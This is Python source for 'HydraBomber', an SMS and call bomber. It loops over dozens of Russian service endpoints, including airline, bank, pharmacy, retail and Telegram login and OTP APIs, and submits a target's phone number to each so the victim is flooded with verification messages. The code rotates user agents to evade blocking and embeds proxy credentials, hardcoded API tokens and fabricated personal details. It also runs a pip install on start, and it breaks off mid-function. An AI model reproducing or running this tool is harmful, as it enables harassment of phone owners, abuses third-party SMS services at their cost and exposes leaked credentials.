import requests
import colorama
from colorama import Fore, Back, Style
from time import sleep
import sys
import os
import threading
import random

#poetry publish --username 0X00077 --password split_termux_228 --build

colorama.init()

logo = ""


def start():
	print(Fore.MAGENTA+"INFO - [ HydraBomber ] - INFO")
	for x in "Разработчик бомбера: 0X00077 cовместно с pr0gr1mm3r":
		print(x, end='')
		sys.stdout.flush()
		sleep(0.05)

	line_1 = "\n\\\Пробую установить обновление//"

	for x in line_1:
		print(x, end='')
		sys.stdout.flush()
		sleep(0.05)

	print("")

	os.system("pip install hydrabomber")

def service_leg(phone, phone_chaev, phone_tvoydom, phone_unitiki, phone_plus, phone_unizoo, phone_nine, phone_mymajor, phone_jumagazin, phone_omskuvelir, phone_tinkoff):
	lap = 0
	header_random = ["Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.3.136 Yowser/2.5 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36 Maxthon/5.3.8.2000",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 YaBrowser/20.12.2.105 Yowser/2.5 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/62.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/88.0.4298.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.3; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 10.0; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.243",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.243"]

	user_agent = random.choice(header_random)

	proxies = {
		"http": 'socks5://sNuU3x:va19h3@5.8.15.120:8000',
		"https": 'socks5://sNuU3x:va19h3@5.8.15.120:8000'
	}

	while True:
		def utair_2_0(phone, user_agent, proxies):
			try:
				requests.post("https://b.utair.ru/api/v1/login/", headers={'user-agent': str(user_agent), "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.utair.ru/"}, json={"login": phone, "confirmation_type": "call_code"})
			except Exception as e:
				print("utair_2_0"+str(e))

		def cloudtis(phone, user_agent, proxies):
			try:
				requests.post("https://lk.cloudtips.ru/api/auth/sms", headers={'user-agent': str(user_agent)}, json={"phoneNumber": "+"+phone})
			except Exception as e:
				print("cloudtis"+str(e))

		def lenta(phone, user_agent, proxies):
			try:
				requests.post("https://lenta.com/api/v1/registration/requestValidationCode", headers={'user-agent': str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("lenta"+str(e))

		def re_store(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://re-store.ru/local/components/multisite/system.auth.sms/ajax.php", headers={'user-agent': str(user_agent)}, data={"action": "code_sms", "PERSONAL_PHONE": phone_chaev, "PERSONAL_EMAIL": ""})
			except Exception as e:
				print("re_store"+str(e))

		def youla(phone, user_agent, proxies):
			try:
				requests.post("https://youla.ru/web-api/auth/request_code", headers={'user-agent': str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("youla"+str(e))

		def tvoydom(phone_tvoydom, user_agent, proxies):
			try:
				requests.post("https://tvoydom.ru/api/internal/component/main:profile.check.phone", headers={'user-agent': str(user_agent)}, data={"tel": phone_tvoydom, "csrf_token": "637dd98cc11c70b51b4e476200cd1442"})
			except Exception as e:
				print("tvoydom"+str(e))

		def zoloto585(phone_chaev, user_agent, proxies):
			try:
				r = requests.post("https://zoloto585.ru/api/bcard/reg2/", headers={"user-agent": str(user_agent)}, json={"name": "Никита", "surname": "Буяров", "patronymic": "Александр", "sex": "m", "birthdate": "05.04.2000", "phone": phone_chaev, "email": "nekirtt@gmail.com", "city": "Москва"})
			except Exception as e:
				print("zoloto585"+str(e))

		def d1achcanypala0j(phone, user_agent, proxies):
			try:
				requests.post("https://xn--j1ab.xn--d1achcanypala0j.xn--p1ai/api/v1/profile/prepare", headers={"user-agent": str(user_agent)}, json={"_form": "reg_signup", "email": "dsdds@gmail.com", "phone": phone, "password": "python228P", "competition_code": "ru_season_4"})
			except Exception as e:
				print("d1achcanypala0j"+str(e))

		def b_apteka(phone, user_agent, proxies):
			try:
				requests.post("https://b-apteka.ru/lk/send_confirm_code", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, json={"phone": phone})
			except Exception as e:
				print("b_apteka"+str(e))

		def sberhealth(phone, user_agent, proxies):
			try:
				requests.post("https://lk.sberhealth.ru/api/gateway/web/rest/v1/auth/sms/initiate", headers={"user-agent": str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("sberhealth"+str(e))

		def unitiki(phone_unitiki, user_agent, proxies):
			try:
				requests.post("https://unitiki.com/login?action=getCode", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, params={"action": "getCode"}, data={"phone": phone_unitiki})
			except Exception as e:
				print("unitiki"+str(e))

		def theobject(phone, user_agent, proxies):
			try:
				requests.post("https://theobject.ru/ajax/form_send.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"send_form_type": "entry_club", "fio": "Никита", "phone": phone, "date": "11"})
			except Exception as e:
				print("theobject"+str(e))

		def broniboy(phone_chaev, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.get("https://broniboy.ru/moscow/", proxies=proxies)
				csrf = r.text[567:655]
				session.post("https://broniboy.ru/ajax/send-sms", headers={"User-Agent": str(user_agent), "X-CSRF-Token": csrf, "X-Requested-With": "XMLHttpRequest"}, data={"phone": phone_chaev, "_csrf": csrf})
			except Exception as e:
				print("broniboy"+str(e))

		def rolf(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://lk.rolf.ru/api/register-sms-code", headers={"user-agent": str(user_agent)}, json={"phone": phone_chaev})
			except Exception as e:
				print("rolf"+str(e))

		def mcdonalds(phone_plus, user_agent, proxies):
			try:
				requests.post("https://site-api.mcdonalds.ru/api/v1/user/login/phone", headers={"user-agent": str(user_agent)}, json={"number": "+"+phone_plus, "g-recaptcha-response": "off"})
			except Exception as e:
				print("mcdonalds"+str(e))

		def delivery(phone, user_agent, proxies):
			try:
				requests.post("https://api.delivery-club.ru/api1.2/user/otp", headers={"User-Agent": str(user_agent)}, data={"phone": phone, "newotp": "1"})
			except Exception as e:
				print("delivery"+str(e))

		def burgerking(phone, user_agent, proxies):
			try:
				requests.post("https://burgerking.ru/middleware/bridge/api/v3/auth/signup", headers={"User-Agent": str(user_agent)}, json={"phone": phone, "invite": ""})
			except Exception as e:
				print("burgerking"+str(e))

		def apteka_ru(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407", headers={"user-agent": str(user_agent)}, params={"cityId": "5e57803249af4c0001d64407"}, json={"phone": phone_chaev})
			except Exception as e:
				print("apteka_ru"+str(e))

		def sunlight(phone, user_agent, proxies):
			try:
				requests.post("https://api.sunlight.net/v3/customers/authorization/", headers={"user-agent": str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("sunlight"+str(e))

		def kristall(phone_chaev, user_agent, proxies):
			try:
				requests.post('https://www.kristall-shop.ru/ajaxer.php?x=personal', headers={"user-agent": str(user_agent)}, params={"x": "personal"}, data={"action": "sms_send", "phone": phone_chaev})
			except Exception as e:
				print("kristall"+str(e))

		def htv(phone, user_agent, proxies):
			try:
				requests.post("https://24htv.platform24.tv/v2/otps", headers={"user-agent": str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("htv"+str(e))

		def savetime(phone, user_agent, proxies):
			try:
				requests.post(f"https://api.savetime.net/v2/client/login/{phone}", headers={"user-agent": str(user_agent)}, data={"accept": "1"})
			except Exception as e:
				print("savetime"+str(e))

		def miratorg(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://shop.miratorg.ru/local/include/ajax/order_register_auth.php", headers={"user-agent": str(user_agent)}, data={"action": "request_registration", "LastName": "", "FirstName": "Вика", "MiddleName": "", "MobilePhone": phone_chaev, "Password": "python228", "GenderCode": "M", "BirthDate": "", "EmailAddress": "", "AllowSms": "on", "AllowEmail": "5", "CardNumber": ""})
			except Exception as e:
				print("miratorg --- "+str(e))

		def unizoo(phone_unizoo, user_agent, proxies):
			try:
				requests.post("https://unizoo.ru/local/components/techdir/auth.phone.confirmation.sms/ajax/handler.php", headers={'user-agent': str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"action": "sendCode", "phone": phone_unizoo, "authType": "register", "repeatToEmail": "false"})
			except Exception as e:
				print("unizoo"+str(e))

		def telegram(phone, user_agent, proxies):
			try:
				r = requests.post("https://my.telegram.org/auth/send_password", headers={'user-agent': str(user_agent)}, data={"phone":"+"+phone})
			except Exception as e:
				print("telegram"+str(e))

		def airsoft(phone_unitiki, user_agent, proxies):
			try:
				requests.post("https://airsoft-rus.ru/bitrix/components/bxmt/phone/sms.php", headers={'user-agent': str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"phone": phone_unitiki, "register": "true"})
			except Exception as e:
				print("airsoft"+str(e))

		def lvlkitchen(phone, user_agent, proxies):
			try:
				requests.post("https://api.crm.p-group.ru/checkout/login", headers={"user-agent": str(user_agent), "x-keypass": "lebfgiuDaeEYiou2%3255$208@{wdw{]}"}, json={"departmentId": 2, "regionId": 2, "phone": phone, "recaptchaToken": "321"})
			except Exception as e:
				print("lvlkitchen"+str(e))

		def modulbank(phone_nine, user_agent, proxies):
			try:
				requests.post("https://my.modulbank.ru/api/v2/auth/repeatSmsCode", headers={"User-Agent": str(user_agent), "X-Requested-With": "XMLHttpRequest", "Accept": "*/*", "Host": "my.modulbank.ru", "RequestSmsId": "defd4054-71d5-46df-954c-4b455b09df4f", "Origin": "https://my.modulbank.ru", "PLATFORM": "web", "Referer": "https://my.modulbank.ru/"}, json={"CellPhone": phone_nine})
			except Exception as e:
				print("modulbank"+str(e))

		def goldapple(phone, user_agent, proxies):
			try:
				r = requests.post("https://goldapple.ru/rest/V1/customer/registration/start", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, json={"country_code": "RU", "phone": phone})
			except Exception as e:
				print("goldapple"+str(e))

		def karusel(phone, user_agent, proxies):
			try:
				requests.post("https://app.karusel.ru/api/v2/token/", headers={"User-Agent": str(user_agent)}, json={"phone": phone, "recaptcha_token": "03AGdBq25Dt3tl1ui3Af8OfhYXFuDHFyR-wDo1Fz3CzuAXTid7_I06xC69_B70umoARae7kIS98QbDJfMO4hsuzelfoB9Lm27-ADSmwBANzc8ZtQLBJsrKCfPLAnblFcUbCZNN6af9pedrKGqercyEj76TjSekDiIiubVdAIwAfuKugF5cErx72kgNPGsGqNIBG0jfekZw7ttWfWDYuSgC7m1F-C_Y10GVDgGlUx2ltAAgN98hccQvUZ2jvok7KDo2LO0hy9MB57_q-Pr70DOCxqNehHsrlVHIYPgWZKzsFbRUF1SOqnfI-_D66TV3U4YVOtWUhHfrd3xqQBVDjpYVRcMUiKT_POVK00uijJIFjfMC0jUNbcA5Rg64d1DP4fsCWk02myzLDviNA2nP76Jujuduzu8XSXGjL_GiwvN6WxwRLswnt9DrEC8"})
			except Exception as e:
				print("karusel"+str(e))

		def mymajor(phone_mymajor, user_agent, proxies):
			try:
				requests.post("https://www.mymajor.ru/ajax/mymajor/registration/", headers={"User-Agent": str(user_agent), "X-Requested-With": "XMLHttpRequest", "Accept": "*/*", "Host": "www.mymajor.ru", "Origin": "https://www.mymajor.ru", "Referer": "https://www.mymajor.ru/"}, data={"phone": phone_mymajor, "surname": "Буярова", "name": "Оля", "petronimic": "Александровна", "i_agree_personal_data": "on", "g-recaptcha-response": ""})
			except Exception as e:
				print("mymajor"+str(e))

		def citilink(phone, user_agent, proxies):
			try:
				requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"})
			except Exception as e:
				print("citilink"+str(e))

		def mkb_broker(phone, user_agent, proxies):
			try:
				requests.post("https://mkb-broker.ru/api/signup/newLogin", headers={"User-Agent": str(user_agent), "X-Requested-With": "XMLHttpRequest"}, json={"appName":"evolution.web","documents":[{"id":110548,"isSigned":"true"},{"id":134504,"isSigned":"true"},{"id":128861,"isSigned":"true"}],"queryParams":{},"phone":phone,"iframe":""})
			except Exception as e:
				print("mkb-broker"+str(e))

		def eda_yandex(phone, user_agent, proxies):
			try:
				requests.post('https://eda.yandex.ru/api/v1/user/request_authentication_code', headers={'user-agent': str(user_agent), "x-requested-with": "XMLHttpRequest"}, json={"phone_number": "+"+phone})
			except Exception as e:
				print("eda.yandex"+str(e))

		def ok_ru(phone, user_agent, proxies):
			try:
				requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", headers={'user-agent': str(user_agent)}, params={"cmd": "AnonymRegistrationEnterPhone", "st.cmd": "anonymRegistrationEnterPhone"}, data={"st.r.phone": "+"+phone})
			except Exception as e:
				print("ok.ru --- "+str(e))

		def oldi(phone_mymajor, user_agent, proxies):
			try:
				requests.post("https://www.oldi.ru/ajax/reg.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest", "origin": "https://www.oldi.ru", "referer": "https://www.oldi.ru/auth/?register=yes&backurl=%2F"}, data={"method": "sendSms", "prefix": "+7", "phone": phone_mymajor})
			except Exception as e:
				print("oldi"+str(e))

		def ICQ(phone, proxies):
			try:
				requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ua", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			except Exception as e:
				print("ICQ"+str(e))

		def mr_cook(phone, user_agent, proxies):
			try:
				r = requests.post("https://mr-cook.ru/wp-admin/admin-ajax.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest", "accept": "*/*", "accept-encoding": "gzip, deflate, br", "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"}, data={"action": "authUser", "phone": "+"+phone})
			except Exception as e:
				print("mr-cook"+str(e))

		def pizzahut(phone, proxies):
			try:
				requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phone, '_token':'*'})
			except Exception as e:
				print("pizzahut"+str(e))

		def livemaster(phone, user_agent, proxies):
			try:
				requests.post("https://www.livemaster.ru/auth/validatephonenumber", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"phoneNumber": "+"+phone})
			except Exception as e:
				print("livemaster"+str(e))

		def alltime(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://www.alltime.ru/sservice/2020/form_register_phone.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"action": "send", "back": "/jewellary/", "phone": phone_chaev})
			except Exception as e:
				print("alltime"+str(e))

		def jumagazin(phone_jumagazin, user_agent, proxies):
			try:
				requests.post("https://jumagazin.ru/includes/confirm_phone.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"PHONE": phone_jumagazin, "SEND_CODE": "Y"})
			except Exception as e:
				print("jumagazin"+str(e))

		def adamas(phone_nine, user_agent, proxies):
			try:
				requests.post("https://rest.adamas.ru/v1/phone/send", headers={"user-agent": str(user_agent), "content-type": "application/json;charset=UTF-8", "origin": "https://www.adamas.ru", "referer": "https://www.adamas.ru/", "authorization": "Bearer xu7CPpdnSFGBD8gEOcHNEdxX1KvTuKXU"}, json={"phone": phone_nine, "action": "registration"})
			except Exception as e:
				print("adamas"+str(e))

		def omskuvelir(phone_omskuvelir, user_agent, proxies):
			try:
				requests.post("https://omskuvelir.ru/ajax/ajax-auth.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"phone": phone_omskuvelir, "type": "sendsms"})
			except Exception as e:
				print("omskuvelir"+str(e))

		def karatov(phone_chaev, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.post("https://karatov.com/catalog/", proxies=proxies)
				if r.text[674739:674740] == '"':
					bxajaxid = r.text[674740:674772]
				else:
					bxajaxid = r.text[674739:674771]
				session.post("https://karatov.com/catalog/", headers={"Upgrade-Insecure-Requests": "1", "User-Agent": str(user_agent), "Host": "karatov.com", "Origin": "https://karatov.com", "Referer": "https://karatov.com/catalog/", "Sec-Fetch-Dest": "iframe", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}, data={"bxajaxid": bxajaxid, "AJAX_CALL": "Y", "page": "", "USER_LOGIN": phone_chaev, "USER_LOGIN_EMAIL": "", "TYPE": "REMEMBER", "USER_PASSWORD": "", "LOGIN_FORM": "Y", "USER_REMEMBER": "Y"})
			except Exception as e:
				print("karatov"+str(e))

		def tinkoff(phone_tinkoff, proxies):
			try:
				requests.post("https://social.journal.tinkoff.ru/api/v18/account/login/phone/", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.279", "X-CSRFToken": "AFDWiSFN0ITImtWjyQsFbIBc778HvwdFs1WWpALeLy4HFwDFAZqgG6cOPEyxHlB2"}, json={"phone": phone_tinkoff, "point_of_contact": "header-login-button"})
			except Exception as e:
				print("tinkoff"+str(e))

		def askona(phone, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.get("https://www.askona.ru/encyclopedia/kak-vybrat-divan/", proxies=proxies)
				csrf = r.text[220052:220084]
				session.get(f"https://www.askona.ru/api/registration/sendcode?csrf_token={csrf}&contact%5Bphone%5D={phone}", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, params={"csrf_token": csrf, "contact[phone]": phone})
			except Exception as e:
				print("askona"+str(e))
		
		def iconjob(phone, proxies):
			try:
				requests.post("https://api.iconjob.co/api/auth/verification_code", headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.279", "x-web-session": "eyJhbGciOiJIUzI1NiJ9.eyJ3c2lkIjoxOTYyMjMxMzJ9.gyzRCpZ7lCsD4V3anEZv51Iog1OHsLJz7E9xL-OoSCs"}, json={"phone": phone})
			except Exception as e:
				print("iconjob"+str(e))

		def mtstv(phone, proxies):
			try:
				requests.post("https://api.mtstv.ru/v1/users", data={'msisdn': phone})
			except Exception as e:
				print("mtstv"+str(e))

		def findclone(phone, user_agent, proxies):
			try:
				requests.get(f"https://findclone.ru/register?phone=+{phone}", headers={"User-Agent": str(user_agent), "X-Requested-With": "XMLHttpRequest"}, params={"phone":  phone})
			except Exception as e:
				print("findclone"+str(e))

		def kari(phone, user_agent, proxies):
			try:
				requests.get(f"https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B{phone}", headers={"User-Agent": str(user_agent), "Host": "i.api.kari.com", "Origin": "https://kari.com", "Referer": "https://kari.com/", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site"})
			except Exception as e:
				print("kari"+str(e))

		def apteka_ot_sklada(phone, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.get("https://apteka-ot-sklada.ru", proxies=proxies)
				r = session.post("https://apteka-ot-sklada.ru/api/auth/requestBySms", headers={"User-Agent": str(user_agent), "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Content-Type": "application/json;charset=UTF-8", "Host": "apteka-ot-sklada.ru", "Origin": "https://apteka-ot-sklada.ru", "Referer": "https://apteka-ot-sklada.ru/"}, json={"phone": phone})
			except Exception as e:
				print("apteka-ot-sklada"+str(e))

		def tvoyapteka(phone_chaev, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.get("https://www.tvoyaapteka.ru/personal/?register=yes", proxies=proxies)
				key = r.text[123910:123942]
